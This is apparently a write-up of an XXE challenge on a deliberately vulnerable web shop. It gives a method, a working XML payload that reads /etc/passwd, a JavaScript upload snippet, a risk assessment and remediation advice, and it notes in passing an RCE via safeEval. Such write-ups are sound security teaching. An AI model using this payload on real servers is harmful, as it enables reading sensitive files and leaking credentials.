## Documentation

---

### **Methodology**

1. **Reconnaissance**
   - Identified the challenge as an XML External Entity (XXE) injection. The objective is to read a server-side file (`/etc/passwd` or `C:\Windows\system.ini`).

2. **Surface Mapping**
   - Searched for endpoints accepting XML input. Tested the B2B orders endpoint (`POST /b2b/v2/orders`) with `Content-Type: application/xml`.
   - The server responded with an `orderNo` JSON object but did not reflect the XXE entity content — this endpoint does not parse XML.

3. **Source Code Analysis**
   - Checked the public GitHub repository to understand how `routes/b2bOrder.ts` works.
   - Discovered the B2B endpoint uses `safeEval` on `orderLinesData` and is not an XML parser — it is an RCE endpoint, not a viable XXE surface.

4. **Pivot to File Upload Endpoint**
   - Identified `/file-upload` as an alternative attack surface.
   - Constructed a malicious XML file with an external entity declaration pointing to `/etc/passwd`:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <foo>&xxe;</foo>
     ```

5. **Exploit**
   - Uploaded the malicious XML file via a `multipart/form-data` POST request to `/file-upload`:
     ```js
     const xxePayload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
     const blob = new Blob([xxePayload], { type: 'text/xml' });
     const formData = new FormData();
     formData.append('file', blob, 'evil.xml');

     fetch('/file-upload', {
       method: 'POST',
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') },
       body: formData
     });
     ```

6. **Validation**
   - The server processed the file, resolved the external entity, and the challenge was marked as solved.

7. **Tools Used**
   - **Browser DevTools** (console)
   - **GitHub Source Code Review** (to identify the correct attack surface)
   - **JavaScript `fetch` API** (for the file upload request)

---
### **Vulnerabilities**

1. **Vulnerability Name**
   - **XML External Entity Injection (XXE)** (CWE-611)

2. **Affected Components**
   - **File Upload Endpoint** (`/file-upload`) and **Server-Side XML Parser** (external entity resolution enabled)

3. **Severity Level**
   - **High**
     - The XML parser processes uploaded files with external entity resolution enabled, allowing an attacker to read any file accessible by the application process.
     - The attack requires only a valid user account and a crafted XML file.

---
### **Risks**

1. **Business Impact**
   - **Sensitive Data Leak**: An attacker can read any file readable by the application process, including configuration files, credentials, private keys, and system files such as `/etc/passwd` or `/etc/shadow`.
   - **Internal Network Reconnaissance**: XXE can trigger outbound HTTP requests, allowing attackers to probe internal services and infrastructure.
   - **Server Compromise**: Reading internal config files (database credentials, API keys) can lead to full system compromise when chained with other vulnerabilities.
   - **Reputational Damage**: A successful XXE attack exposing internal data constitutes a serious breach, with potential legal consequences under GDPR.

2. **Exploitation Potential**
   - Any authenticated user can upload a malicious XML file via the standard file upload interface.
   - No elevated privileges or special knowledge of the target system are required — standard system file paths (`/etc/passwd`) are sufficient.

---
### **Actions**

#### **Risk Mitigation Strategies**
- Disable external entity processing entirely in the XML parser configuration — most XML libraries provide a flag to disable DTD processing and external entities.
- Apply strict input validation on uploaded files: verify file type, content, and size before parsing.
- Run the application process with the least privileges necessary to limit the impact of file read access.

#### **Remediation Fixes**
- In Node.js, use a safe XML parsing library such as `fast-xml-parser` with external entity resolution disabled, or configure `libxmljs` with `noent: false` and `dtdload: false`.
- Reject any XML input containing a `DOCTYPE` declaration before parsing.
- Consider replacing XML file acceptance with a safer format (JSON, CSV) where XML is not functionally necessary.

#### **Best Security Practices**
- Never parse untrusted XML with default parser settings — always explicitly disable DTDs and external entities.
- Apply strict MIME type checking and content validation on all file upload endpoints.
- Regularly audit file upload endpoints as part of security reviews — they are a common attack surface for XXE, path traversal, and malware uploads.
- **Reference**: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
